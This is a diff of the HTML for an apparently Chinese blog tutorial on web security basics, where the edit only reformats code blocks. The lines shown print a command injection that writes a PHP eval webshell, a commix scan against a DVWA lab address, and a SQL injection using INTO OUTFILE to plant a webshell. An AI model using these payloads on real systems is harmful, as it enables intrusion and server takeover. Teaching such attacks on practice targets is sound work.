@@ -123,7 +123,7 @@
 <meta property="og:description" content="写在前面  开放式Web应用程序安全项目公布的十大WEB安全漏洞OWASP TOP 10 2017   WEB安全三境界 Tools User   工具小子对各种漏洞原理浅浅了解，缺乏Web站点开发与运维经验能力，缺乏对HTTP协议的掌握，只能略读懂（甚至不懂）一种或多种脚本语言。通常只会使用别人开发的攻击测试工具（以Windows GUI为主），以猜测弱口令、自主利用“BB型”漏洞或者使用他人漏">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://img.mp.itc.cn/upload/20170417/9286692719ce46c1829a3c16486942c3_th.jpeg">
-<meta property="og:updated_time" content="2017-09-22T11:52:22.000Z">
+<meta property="og:updated_time" content="2017-09-22T11:54:01.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全扫盲Demo">
 <meta name="twitter:description" content="写在前面  开放式Web应用程序安全项目公布的十大WEB安全漏洞OWASP TOP 10 2017   WEB安全三境界 Tools User   工具小子对各种漏洞原理浅浅了解，缺乏Web站点开发与运维经验能力，缺乏对HTTP协议的掌握，只能略读懂（甚至不懂）一种或多种脚本语言。通常只会使用别人开发的攻击测试工具（以Windows GUI为主），以猜测弱口令、自主利用“BB型”漏洞或者使用他人漏">
@@ -437,7 +437,7 @@
 <li><p>写入webshell<br><code>1;echo &#39;&lt;?php eval($_POST[&quot;c&quot;]);?&gt;&#39; &gt; ws.php</code></p>
 </li>
 <li><p>利用commix自动测试</p>
-<p><code>python commix.py --url=&quot;http://172.17.205.232:89/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot;  --cookie=&quot;PHPSESSID=sh36ods5unj4lqfuuojohp0o44;security=low&quot;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python commix.py --url=&quot;http://172.17.205.232:89/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot;  --cookie=&quot;PHPSESSID=sh36ods5unj4lqfuuojohp0o44;security=low&quot;</div></pre></td></tr></table></figure>
 </li>
 </ol>
 <h5 id="（二）-SQL注入漏洞"><a href="#（二）-SQL注入漏洞" class="headerlink" title="（二） SQL注入漏洞"></a>（二） SQL注入漏洞</h5><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
@@ -455,7 +455,7 @@
 </ol>
 <ol>
 <li><p>拿shell(需要知道绝对路径和写权限)</p>
-<p><code>&#39;union select 1,&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; INTO OUTFILE &#39;/var/www/dvwa/cmd.php&#39; #</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;union select 1,&apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; INTO OUTFILE &apos;/var/www/dvwa/cmd.php&apos; #</div></pre></td></tr></table></figure>
 </li>
 <li><p>使用sqlmap测试（略）</p>
 </li>
